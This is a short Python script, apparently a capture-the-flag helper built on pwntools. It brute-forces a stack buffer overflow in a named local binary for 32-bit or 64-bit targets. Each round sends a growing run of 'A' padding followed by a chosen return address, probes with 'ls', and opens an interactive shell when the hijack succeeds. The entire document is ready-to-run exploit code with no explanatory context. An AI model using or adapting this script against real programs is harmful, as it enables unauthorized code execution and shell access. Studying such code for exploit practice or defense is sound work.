from pwn import*

def bit32_exploit(binary_name, input_addr):
	
	i = 1

	while i < 100000:
		print('roop ', i)
		p = process('./'+binary_name)
		context.log_level='debug'		

		payload = ''
		payload += 'A'*i
		payload += p32(input_addr)
		p.sendline(payload)
		sleep(0.1)

		try:
			p.sendline('ls')
		except:
			i += 1
		else:
			p.interactive()
			break

def bit64_exploit(binary_name, input_addr):
	
	i = 1
		
	while i < 100000:
		print('roop ' ,i)
		p = process('./'+binary_name)
		context.log_level='debug'
		payload = ''
		payload += 'A'*i
		payload += p64(input_addr)
		
		p.sendline(payload)
		
		sleep(0.1)
		
		try:
			p.sendline('ls')
		except:
			i += 1
		else:
			p.interactive()
			break



binary_name = raw_input('binary name : ').rstrip('\n')
binary_data = int(input('32 bit or 64 bit : '))
input_addr = int(input('input addr : '))


if binary_data == 32:
	bit32_exploit(binary_name, input_addr)

elif binary_data == 64:
	bit64_exploit(binary_name, input_addr)
